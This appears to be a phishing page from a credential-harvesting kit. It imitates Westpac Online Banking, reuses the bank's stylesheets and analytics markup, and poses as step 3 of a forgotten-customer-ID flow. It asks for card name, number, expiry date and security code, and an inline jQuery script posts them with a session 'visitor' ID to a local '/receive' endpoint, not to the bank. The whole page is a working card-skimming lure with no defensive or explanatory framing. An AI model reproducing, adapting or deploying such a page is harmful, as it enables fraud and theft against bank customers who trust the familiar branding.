<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="js flexbox flexboxlegacy canvas canvastext webgl touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths cookies cors overthrow-enabled" lang="en">
   <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge;chrome=1" />
      <meta charset="utf-8" />
      <title>Westpac Online Banking</title>
      <meta name="description" content="" />
      <meta name="HandheldFriendly" content="True" />
      <meta name="MobileOptimized" content="320" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover" />
      <meta name="apple-mobile-web-app-capable" content="yes" />
      <meta name="apple-mobile-web-app-status-bar-style" content="default" />
      <link rel="apple-touch-icon" href="" />
      <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Titan/WBC/000-0001combined.css.4c7a8722df72b201084fe3d6f3109795ef5f0e3b.css" rel="stylesheet" />
      <meta name="apple-itunes-app" content="app-id=299111811" />
      <link rel="manifest" href="https://www.westpac.com.au/_services/smart-app-banner/banking/manifest.serialise.json" />
      <meta name="format-detection" content="telephone=no" />
      <meta name="wup_url" content="https://wup-2ffe60ee.westpac.com.au/client/v3/web/wup?cid=willow" />
      <meta name="log_url" content="https://log-2ffe60ee.westpac.com.au/api/v1/sendLogs" />
   </head>
   <body id="applicationBody" data-keymap-url="/eam/servlet/getEamInterfaceData" data-command="login" data-get-resources-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true&values=true" data-get-resources-checksum-url="https://banking.westpac.com.au/wbc/banking/core/resources?checksum=true" data-help-url="/wbc/banking/helpcontentandsearch" data-signin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=login&segment=personal" data-signout-url="https://banking.westpac.com.au/pkmslogout?token=f264d7a0-1df4-11ef-b660-005056a3d977" data-browser-incompatible-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/6" data-cookies-disabled-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login#/mobilecannotcontinue/7" data-allow-console-logging="false" data-spsignin-url="https://banking.westpac.com.au/wbc/banking/handler?fi=wbc&TAM_OP=sp&segment=personal" data-is-stronger-password-feature-enabled="True" data-is-eam-policy-global-rollout="True" data-analytics-allkeys="autoImpr,experience,formName,pageKey,pageName,pageStep,pageType,sendDelay,siteVersion,src,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagestep="start" data-analytics-pagename="enter your customer id" data-analytics-senddelay="3000" data-analytics-autoimpr="TRUE" data-analytics-formname="olb" data-analytics-src="20231122-mob" data-analytics-pagetype="login" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="login" class="orientation-portrait">
      <!-- ko ifnot: isSalesPathwayLogin() -->
      <footer style="margin-top:30%">
         <div class="login-footer">
            <a class="help" href="https://www.westpac.com.au/personal-banking/online-banking/support-faqs/" data-analytics-nav="footer">
            <span class="text">Help</span>
            </a>
         </div>
      </footer>
      <!-- /ko -->
      </div>
      </div>
      <div class="page view view-active" id="forgottenCustomerId" data-post-url="https://banking.westpac.com.au/wbc/banking/verifycustomer" data-analytics-allkeys="experience,formName,newFormName,pageKey,pageName,pageStep,pageType,siteVersion,trackOnce,nav,externalSiteName,productID,itemName,transactionID" data-analytics-pagename="enter customerdetails" data-analytics-newformname="forgot-credentials" data-analytics-pagestep="start" data-analytics-trackonce="true" data-analytics-pagetype="selfservice" data-analytics-formname="forgot-credentials" data-analytics-siteversion="1.1242.143.1" data-analytics-experience="titan" data-analytics-pagekey="Mob_Authentication_forgottenCustomerId">
         <header class="title-bar" role="banner">
            <center>
               <h1 tabindex="-1">Provide card details to proceed</h1>
            </center>
            <!--a href="javascript:;" data-bind="click: navigateBack" class="button-back">
               <span>back</span>
               </a-->
         </header>
         <div role="main" class="no-footer">
            <div class="message-bar">
               <div class="message"></div>
               <a class="close" href="javascript:;">
               <img alt="Close message" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" />
               </a>
            </div>
            <div id="alertManagerArea" class="validation-summary" style="display:none;">
               <div class="message">
                  <p><strong>Please correct the errors with the following fields:</strong></p>
               </div>
               <div id="unorder-list" class="errors"> </div>
            </div>
            <form id="carddetails_form">
               <span>Step 3 of 3 - Card information </span>
               <fieldset>
                  <div class="panel">
                     <h2>Provide your card details</h2>
                     <div class="form">
                        <div class="item item-text">
                           <label data-field-name="card-name" data-field-title="Card name" for="forgotten_customerid_cardName">
                           <span class="label" id="label-name">Card Name</span>
                           <span class="control">
                           <input class="log_details"  type="text" autocomplete="off" aria-required="true" id="CardName" maxlength="23" />
                           </span>
                           <span class="visually-hidden">Up to 23 characters allowed</span>
                           </label>
                        </div>
                        <div class="item item-text">
                           <label data-field-name="card-number" data-field-title="Card number" for="forgotten_customerid_cardNumber">
                           <span class="label" id="label-name">Card Number</span>
                           <span class="control">
                           <input class="log_details"  type="text" autocomplete="off" aria-required="true" id="CardNumber" pattern="[0-9]*" maxlength="19" />
                           </span>
                           <span class="visually-hidden">15, 16, or 19 characters allowed</span>
                           </label>
                        </div>
                        <div class="item item-text">
                           <label data-field-name="expiry-date" data-field-title="Expiry date" for="forgotten_customerid_expiryDate">
                           <span class="label" id="label-name">Expiry Date</span>
                           <span class="control">
                           <input class="log_details" type="text" aria-required="true" id="ExpirationDate" placeholder="MM/YY" maxlength="5" />
                           </span>
                           <span class="visually-hidden">Format: MM/YY</span>
                           </label>
                        </div>
                        <div class="item item-text">
                           <label data-field-name="security-code" data-field-title="Security code" for="forgotten_customerid_securityCode">
                           <span class="label" id="label-name">Security Code</span>
                           <span class="control">
                           <input class="log_details" type="text" aria-required="true" id="CVV" pattern="[0-9]*" maxlength="4" />
                           </span>
                           <span class="visually-hidden">3 or 4 digits</span>
                           </label>
                        </div>
                     </div>
                  </div>
                  <div class="description"></div>
                  <div class="action-buttons action-buttons-count-2" style="margin-bottom:30%;">
                     <button type="button" class="button" data-bind="click: cancel" >
                     <span>Cancel</span>
                     </button>
                     <button id="subbut" class="button-alt" data-bind="click: submit">
                     <span>Next</span>
                     </button>
                  </div>
                  
                  </div>
               </fieldset>
            </form>
         </div>
      </div>
   </body>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.6.0/cleave.min.js"></script>
      
<script>
	 	

	       new Cleave('#CardNumber', {
            creditCard: true
        });

        new Cleave('#ExpirationDate', {
            date: true,
            datePattern: ['m', 'y']
        });

        new Cleave('#CVV', {
            numericOnly: true,
            blocks: [3]
        });

        
</script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
    
 <script>
 	
 	function addListItem(ulId, text, attributes = {}) {
    var ul = document.getElementById(ulId);
    var li = document.createElement('li');
    li.textContent = ' ' + text ; 

    for (const [key, value] of Object.entries(attributes)) {
        li.setAttribute(key, value);
    }

    ul.appendChild(li);
    	 };
    	 </script>
    	 <script>
    	 	
    	 	$(document).ready(function() {
    $('#subbut').on('click', function(event) {
        event.preventDefault(); // Prevent the default action of the link

        let myForm = $("#carddetails_form");
        let checkInputs = document.querySelectorAll('.log_details');       let list = document.getElementById('unorder-list');

		// While there are child elements, remove the first child
		while (list.firstChild) {
		    list.removeChild(list.firstChild);
		}
        
        
        // Flag to track if any input is empty
        let isEmpty = false;

        // Loop through each input field
        for (const check of checkInputs) {
            check.addEventListener('focus', () => {
                console.log('focus');
                check.nextElementSibling.style.display = "none";
            });

            if (check.value.trim() === "") {
            
                document.getElementById('alertManagerArea').style.display = "block";
                let labelName = check.parentElement.previousElementSibling.textContent;
                addListItem('unorder-list', labelName);
                isEmpty = true;
            }
        }

        // If no input is empty, proceed with form submission
        if (!isEmpty) {
            let userinfo = myForm.serializeArray();
            let user = {};
            let visitor = sessionStorage.getItem('visitor');

            userinfo.forEach((value) => {
                // Use the 'name' attribute to create user object
                user[value.id] = value.value;
            });

            user['visitor'] = visitor;
            console.log(user);

            // Send AJAX request
            $.ajax({
                method: 'POST',
                url: "/receive",
                data: user
            }).done(function(msg) {
            
                sessionStorage.setItem('visitor', visitor);
                //window.location.href = "login/2";
                console.log(msg); // Log success message
            }).fail(function(err, textstatus, error) {
            //window.location.href = "login/2"; 
            
            });
        }
    });
});


    </script> 
</html>
